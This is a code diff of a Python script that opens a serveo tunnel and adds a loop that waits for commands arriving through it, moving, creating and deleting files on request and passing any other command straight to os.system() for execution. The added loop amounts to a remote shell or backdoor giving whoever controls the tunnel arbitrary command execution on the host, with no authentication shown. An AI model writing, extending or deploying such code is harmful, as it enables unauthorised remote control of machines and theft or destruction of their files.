@@ -58,9 +58,6 @@ def main():
         # Step 3: Wait for subdomain to be ready and print URL
         print(serveo_process.communicate()[0].decode("utf-8"))
 
-
-        
-
     # Step 4: Create functions to wait for a command from another script through the tunnel and make/delete/upload and download files
     def wait_for_command():
         # Wait for a command to be received
@@ -74,29 +71,68 @@ def main():
                 pass
             time.sleep(1)
 
-    def make_file(filename, content):
-        # Create a file with the given filename and content
-        with open(filename, "w") as f:
-            f.write(content)
-        print(f"Created file '{filename}' with content: {content}")
-    
-    def delete_file(filename):
-        # Delete the file with the given filename
-        os.remove(filename)
-        print(f"Deleted file '{filename}'")
-    
-    def upload_file(local_filename, remote_filename):
-        # Upload the file with the given local filename to the server with the given remote filename
-        files = {'file': open(local_filename, 'rb')}
-        r = requests.post(f"{ngrok_url}/upload/{remote_filename}", files=files)
-        print(f"Uploaded file '{local_filename}' to '{remote_filename}' on the server with status code {r.status_code}")
-    
-    def download_file(remote_filename, local_filename):
-        # Download the file with the given remote filename from the server and save it locally with the given filename
-        r = requests.get(f"{ngrok_url}/download/{remote_filename}")
-        with open(local_filename, 'wb') as f:
-            f.write(r.content)
-        print(f"Downloaded file '{remote_filename}' from the server to '{local_filename}' with status code {r.status_code}")
+    def download_file(file_path, file_name):
+        # Download the file from the server
+        url = f"http://localhost/{file_path}"
+        response = requests.get(url)
+        with open(file_name, "wb") as f:
+            f.write(response.content)
+
+    def upload_file(file_path, file_name):
+        # Upload the file to the server
+        url = f"http://localhost/{file_path}"
+        with open(file_name, "rb") as f:
+            response = requests.post(url, files={"file": f})
+
+    def make_file(file_path):
+        # Create a new file on the server
+        url = f"http://localhost/{file_path}"
+        response = requests.put(url)
+
+    def delete_file(file_path):
+        # Delete a file on the server
+        url = f"http://localhost/{file_path}"
+        response = requests.delete(url)
+
+    while True:
+        # Wait for a command from another script through the tunnel
+        command = wait_for_command()
+
+        # Check if the command is a download request
+        if command.startswith("download "):
+            # Extract the file path from the command
+            file_path = command.split(" ")[1]
+
+            # Download the file from the server
+            download_file(file_path, file_path.split("/")[-1])
+
+        # Check if the command is an upload request
+        elif command.startswith("upload "):
+            # Extract the file path from the command
+            file_path = command.split(" ")[1]
+
+            # Upload the file to the server
+            upload_file(file_path, file_path.split("/")[-1])
+
+        # Check if the command is a make file request
+        elif command.startswith("make "):
+            # Extract the file path from the command
+            file_path = command.split(" ")[1]
+
+            # Create a new file on the server
+            make_file(file_path)
+
+        # Check if the command is a delete file request
+        elif command.startswith("delete "):
+            # Extract the file path from the command
+            file_path = command.split(" ")[1]
+
+            # Delete a file on the server
+            delete_file(file_path)
+
+        else:
+            # Execute the command
+            os.system(command)
 
 if __name__ == "__main__":
     main()
